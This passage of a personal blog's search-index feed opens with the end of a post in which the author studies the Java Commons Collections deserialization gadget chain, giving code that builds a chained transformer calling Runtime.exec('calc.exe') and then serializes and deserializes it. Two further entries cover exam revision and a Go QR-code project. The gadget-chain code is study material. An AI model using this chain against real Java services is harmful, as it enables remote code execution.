class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">//        Class&lt;Runtime&gt; clazz = Runtime.class;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        Method getRuntimeMethod = clazz.getMethod(&quot;getRuntime&quot;, null);</span><br><span class="hljs-comment">//        Object o = getRuntimeMethod.invoke(null, null);</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">//        execMethod.invoke(o, &quot;calc.exe&quot;);</span><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-comment">//  Class&lt;Runtime&gt; clazz</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 得到  Method getRuntimeMethod</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-comment">// 得到 Object o</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br><br>        <span class="hljs-comment">// valueTransformer == invokerTransformer</span><br>        Map&lt;String, Object&gt; decorated = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, decorated);<br>        serializable(o);<br>        unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>注释是为了自己看的明白过程。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>27/11</title>
      <link href="/2024/11/28/27-11/"/>
      <url>/2024/11/28/27-11/</url>
      
        <content type="html"><![CDATA[<p>不想复习，下学期一定上课听课，不跟老狗一样，不然期末复习就是高三。数据库原理及其应用真的离谱，为什么全是概念。我还以为名字写错了，我还去看了一眼，555。</p><p>万恶的驾校教练，抢红包10个中一个运气王练车，还只有下午可以练车。我想开车，honghong</p><p>最后找片博客复习数据库原理及其应用了，简直是我男神。👍👍👍👍</p><p><a href="https://blog.csdn.net/weixin_45591044/article/details/106350680">【最全】《数据库原理及应用》知识点整理+习题_数据库原理及应用知识点总结-CSDN博客</a></p><p><a href="https://blog.csdn.net/Dustinthewine/article/details/129072315">数据库原理及应用期末复习汇总(附某高校期末真题试卷)_数据库原理期末考试题-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_67724631/article/details/135299151">数据库原理与应用快速复习（期末急救）_数据库原理 考试-CSDN博客</a></p><p>我靠想起来了，还有数据结构和计网，特别是计网需要找资料复习。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>new-start</title>
      <link href="/2024/11/17/new-start/"/>
      <url>/2024/11/17/new-start/</url>
      
        <content type="html"><![CDATA[<p>新开始，准备把之前那个EK做一个web端和应用端，内容简单，之前使用的是python语言开发的，主要结果是生成一个二维码，好在go语言强大的第三方库支持了二维码生成的功能。</p><p>其实这段时间挺迷茫的，总想学点什么，做点什么，但一直没什么想法，那个EK项目也就是半半自动，没什么技术含量，满足自我的虚荣心，但是也给了我继续的动力。</p><p>从小做起，感谢EK！</p><p>之后相关内容会在这公布。睡个觉先。</p><p>没睡着</p><p><a href="https://github.com/rPniu/EK/tree/go-fyne">rPniu&#x2F;EK at go-fyne</a></p>]]></content>
      
      
      <categories>
          
          <category> go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> EK </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
